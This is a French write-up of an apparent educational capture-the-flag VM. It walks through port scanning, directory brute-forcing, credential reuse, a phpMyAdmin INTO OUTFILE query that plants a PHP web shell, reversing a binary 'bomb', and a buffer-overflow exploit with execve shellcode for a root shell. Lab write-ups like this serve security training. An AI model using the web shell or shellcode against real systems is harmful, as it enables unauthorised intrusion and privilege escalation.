# Writeup1

## Pré-requis

Avant de commencer cet _exploit_, vérifiez que ces pré-requis sont présents :

- Une machine virtuelle : au choix `VMware` ou `VirtualBox`. Nous avons préféré `VMware`.
- `nmap` : faites `brew install nmap`, l'installation prend une dizaine de minutes.
- python 3.x.

## Préliminaires

> __Avertissement__ : l'adresse IP présente dans ce writeup est un exemple, elle peut changer.

Lancez la VM.

Les étapes suivantes sont reprises dans le `script1.sh`.

Un `ifconfig` nous permet de voir les IPs disponibles sur notre machine.

```bash
$> ifconfig
[...]
vmnet8: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	ether 00:50:56:c0:00:08
	inet 192.168.85.1 netmask 0xffffff00 broadcast 192.168.85.255
```

`vmnet8` correspond à notre machine virtuelle. Dans l'exemple précédent l'IP correspondante est `192.168.85.1`. Nous allons utiliser le logiciel `nmap` pour écouter les ports, de 1 à 255, qui sont utilisés :

```bash
$> nmap 192.168.85.1-255
[...]
Nmap scan report for 192.168.85.1
Host is up (0.00015s latency).
Not shown: 969 closed ports, 28 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
111/tcp open  rpcbind
668/tcp open  mecomm

Nmap scan report for 192.168.85.136
Host is up (0.00050s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
[...]
``` 

Nous constatons que l'IP `192.168.85.136` possède de multiples ports ouverts : `ssh`, `http`, `https`, `imap`, etc. Vous pouvez tester dans un navigateur d'aller voir `http://192.168.85.136` : un page statique s'affiche mais rien d'intéressant à en tirer.

Afin d'avoir une idée plus précise de l'architecture du site, nous utilisons le logiciel `dirb` qui va tester de multiples chemin et nous retourner ceux qui ne renvoient pas d'erreurs.

Nous lançons le programme dirb qui prends deux arguments :

```
$> ./dirb https://192.168.85.136/ dirb222/wordlists/common.txt
[...]
---- Scanning URL: https://192.168.85.136/ ----
+ https://192.168.85.136/cgi-bin/ (CODE:403|SIZE:291)
==> DIRECTORY: https://192.168.85.136/forum/
==> DIRECTORY: https://192.168.85.136/phpmyadmin/
+ https://192.168.85.136/server-status (CODE:403|SIZE:296)
==> DIRECTORY: https://192.168.85.136/webmail/
[...]
```

Grâce à cela, nous pouvons voir que le serveur a un `/forum`, un `/phpmyadmin` et un `/webmail`. De plus, nous avons accès directement à plusieurs dossiers et sous-dossiers.

## Le forum

Rendez vous sur le forum : `https://192.168.85.136/forum`. `lmezard` a posté un topic : `Probleme login ?`. En observant les informations, nous constatons que le mot `password` revient souvent. En faisant une recherche dessus nous repérons une ligne particulière :

```text
[...]
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
[...]
```

`!q\]Ej?*5K5cy*AJ` correspond au mot de passe de `lmezard` ! Connectez vous à l'aide de ces identifiants et rendez vous dans le panneau de configuration. Nous pouvons récupérer son mail : `laurie@borntosec.net`. Il y a sûrement quelque chose à tenter avec ce dernier puisque nous savons que le serveur possède un serveur mail `imap`.

## Le mail

Rendez vous maintenant sur le webmail : `https://192.168.85.136/webmail`. Nous savons que son mail est `laurie@borntosec.net`. Se pourrait-il que cet utilisateur utilise le même mot de passe que pour le forum ?! Oui ! L'erreur de Laurie aura été de garder le même mot de passe sur le forum et sur sa boîte mail... Connectez vous avec : `!q\]Ej?*5K5cy*AJ`.

Nous tombons sur un mail `DB Access`. Dans ce mail, le login `root` et le password `Fg-'kKXBj87E:aJ$` sont laissés en clair. Nous pouvons tranquillement nous connecter à PhpMyAdmin, c'est du propre !

## PhpMyAdmin

Connectez vous à `https://192.168.85.136/phpmyadmin` avec les informations au dessus.

Nous avons la possibilité de faire une injection SQL. Cliquez sur l'onglet SQL et copiez/collez la ligne suivante :

```sql
select "<? System($_REQUEST['cmd']); ?>" into outfile "/var/www/forum/templates_c/inject.php";
```

En utilisant les informations données par `dirb` et en testant différents dossiers nous trouvons un sous-dossier libre d'accès : `/var/www/forum/templates_c/`.

Cette injection SQL va nous permettre ensuite d'exécuter des commandes shells directement dans la barre de navigation comme celle-ci : `https://192.168.85.136/forum/templates_c/inject.php?cmd=ls%20/home`. Nous pouvons ainsi explorer les dossiers et fichiers qui se trouvent sur le serveur.

En rentrant cela dans votre barre de navigation :

```
https://192.168.85.136/forum/templates_c/inject.php?cmd=cat%20/home/LOOKATME/password
```

Vous découvrez de nouvelles informations intéressantes : `lmezard:G!@M6f4Eatau{sF"`. Cela ressemble beaucoup à un identifiant et un mot de passe, n'est-ce-pas ?

## La VM

Vous pouvez maintenant vous connecter à la VM. Un fichier `fun` est présent et un `README`. Nous allons modifier les droits d'accès afin de récupérer ce fichier :

```bash
$> cd ..
$> chmod 777 lmezard
$> cd lmezard
$> chmod 777 fun
```

Vous pouvez maintenant récupérer son contenu sur votre Mac en utilisant l'injection SQL `https://192.168.85.136/forum/templates_c/inject.php?cmd=cat%20/home/lmezard/fun` qui affichera le contenu. Il suffit de le copier/coller dans un nouveau fichier `fun.c`.

## fun

### main

C'est un vrai bazard ! Après un peu d'investigation et de nettoyage du fichier nous obtenons la fonction `main` qui suit :

```C
int main() 
{
    printf("M");
    printf("Y");
    printf(" ");
    printf("P");
    printf("A");
    printf("S");
    printf("S");
    printf("W");
    printf("O");
    printf("R");
    printf("D");
    printf(" ");
    printf("I");
    printf("S");
    printf(":");
    printf(" ");
    printf("%c",getme1());
    printf("%c",getme2());
    printf("%c",getme3());
    printf("%c",getme4());
    printf("%c",getme5());
    printf("%c",getme6());
    printf("%c",getme7());
    printf("%c",getme8());
    printf("%c",getme9());
    printf("%c",getme10());
    printf("%c",getme11());
    printf("%c",getme12());
    printf("\n");
    printf("Now SHA-256 it and submit");
}
```

### getme

Nous avons donc 12 fonctions `getme` qui renvoient un caractère.

En utilisant la fonction `grep` sur un fichier `fun` un minimum propre nous trouvons :

```C
char getme8() { return 'w'; }
char getme9() { return 'n'; }
char getme10() { return 'a'; }
char getme11() { return 'g'; }
char getme12() { return 'e'; }
```

Ces fonctions sont faciles à comprendre. Cependant, il nous manque 7 autres `getme`. Les suivantes sont un poil plus compliquées à interpréter. Par exemple, nous avons :

```C
getme6() { //file521ft_fun/AW0DQ.pcap0000640000175000001440000000003412563172202012520 0ustar nnmusers}
```

Nous constatons qu'il y a un commentaire avec une mention `file521`. En cherchant la ligne où se situe `file522` nous obtenons :

```bash
$> grep -in file522 fun_formatted.c
888:void useless() { //file406ft_fun/T7VV0.pcap0000640000175000001440000000002712563172202012534 0ustar nnmusers	return 'r'; //file369ft_fun/KV7B9.pcap0000640000175000001440000000005312563172202012507 0ustar nnmusers	printf("Hahahaha Got you!!!\n"); //file23ft_fun/J5LKW.pcap0000640000175000001440000000002712563172202012542 0ustar nnmusers	return 't'; //file522ft_fun/KVYKW.pcap0000640000175000001440000000005312563172202012620 0ustar nnmusers	printf("Hahahaha Got you!!!\n"); //file45ft_fun/GXPKY.pcap0000640000175000001440000000003412563172202012606 0ustar nnmusers}
```

Nous constatons qu'il y a un `return 't'` juste avant `//file522`. Cela correspond à notre `getme6()` ! De la même manière, nous trouvons :

```C
char getme1() { return 'I'; }
char getme2() { return 'h'; }
char getme3() { return 'e'; }
char getme4() { return 'a'; }
char getme5() { return 'r'; }
char getme6() { return 't'; }
char getme7() { return 'p'; }
```

Ce qui nous donne `Iheartpwnage` que nous hashons en `sha256` : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.

Vous pouvez donc vous connecter en `ssh` avec le login `laurie` et le mot de passe au-dessus :

```bash
$> ssh laurie@192.168.85.136
```

## Bomb

Une fois connecté, vous vous retrouvez avec une `bomb` à désamorcer. C'est un exécutable qui semble prendre plusieurs mots de passe et l'ensemble de ces mots de passe nous donnerons le mot de passe `ssh` pour le compte `thor`.

Nous allons effectuer plusieurs étapes pour trouver les mots de passe qui permettent de désamorcer la bombe. Parfois simplement en explorant le binaire ou bien en faisant un peu de _reverse-engineering_. Pour se faire, nous utiliserons quatre outils utiles :

- `gdb` : le débugueur GNU, extrêmement pratique pour suivre notre programme,
- `objdump -t` : nous révèle les symboles,
- `objdump -d` : affiche le code assembleur,
- `strings` : affiche tout ce qui peut l'être à partir de notre binaire.

### 1ère étape

En explorant le binaire (notamment en faisant `objdump -d bomb`), nous constatons la présence de `<phase_1>`, `<phase_2>`, etc. qui se succèdent dans `<main>`. Cela correspond aux différentes étapes à passer.

L'étude de cette fonction nous montre le modèle suivant : la fonction prend une _string_ et la stock dans un registre pour la comparer à une autre _string_ présente à une certaine adresse. Nous pouvons donc aller voir quelle est cette chaîne de caractères :

```bash
$> gdb bomb
[...]
(gdb) break phase_1
Breakpoint 1 at 0x8048b26
(gdb) run
Starting program: /home/laurie/bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
test

Breakpoint 1, 0x08048b26 in phase_1 ()
(gdb) p/x $eax
$1 = 0x804b680
(gdb) x /25c 0x804b680
0x804b680 <input_strings>:	116 't'	101 'e'	115 's'	116 't'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0x804b688 <input_strings+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0x804b690 <input_strings+16>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0x804b698 <input_strings+24>:	0 '\000'
(gdb) x /25c 0x80497c0
0x80497c0:	80 'P'	117 'u'	98 'b'	108 'l'	105 'i'	99 'c'	32 ' '	115 's'
0x80497c8:	112 'p'	101 'e'	97 'a'	107 'k'	105 'i'	110 'n'	103 'g'	32 ' '
0x80497d0:	105 'i'	115 's'	32 ' '	118 'v'	101 'e'	114 'r'	121 'y'	32 ' '
0x80497d8:	101 'e'
```

Nous avons donc une comparaison avec une _string_ qui ressemble à "Public speaking is very e". Un simple `strings bomb | grep P` nous permet de tomber sur cette _string_ : `Public speaking is very easy.` !

### 2ème étape

En observant `<phase_2>` avec `objdump -d bomb`, nous notons un appel à la fonction `<read_six_numbers>`. Cette fonction vérifie que l'entrée correspond à 6 _integers_ séparés par des espaces.

Dans `gdb`, nous pouvons donc fixer un _breakpoint_ sur `<phase_2>` et puis faire un `disas` qui va nous afficher le code assembleur de la fonction.

`1 2 6 24 120 720`

### 3ème étape

`1 b 214`

### 4ème étape

`9`

### 5ème étape

`opekmq`

### 6ème étape

`4 2 6 3 1 5`

Bravo ! Nous pou

On se connecte en ssh avec le login : `thor` et password : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

Un fichier `turtle` contenant des mouvements à faire, est présent.
On regarde sur internet `turlte python` => https://docs.python.org/2/library/turtle.html
On a fait un script `turtle.py` qui va import la lib `turlte` et faire les mouvements up, down, left, right
Le tracé se fait tout seul et il est affiché `slash`, on le hache en `md5`

On se connecte en ssh avec login : `zaz` et password : `646da671ca01bb5d84dbb5fb2238dc8e`
Un executable `exploit_me` est présent à la racine. Il faut faire du `buffer_overflow` pour cette partie
Du coup on fait un `export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'`
Ce qui correspond à l'ouverture d'un shell en `shellcode`
Un programme en C nous indique ou se trouve le shellcode en mémoire
./exploit_me `python -c 'print "\x90" * 140 + "SHELLCODE"'`
On ecrit `\x90` sur 140 octets (ce qui corresponds a un NOP, cela passe a l'octet suivant) puis le shellcode.
Le programme va lire le shellcode et ouvrir un nouveau shell en root car l'user qui a crée `./exploit_me` est `root`.

# Yes we dit it !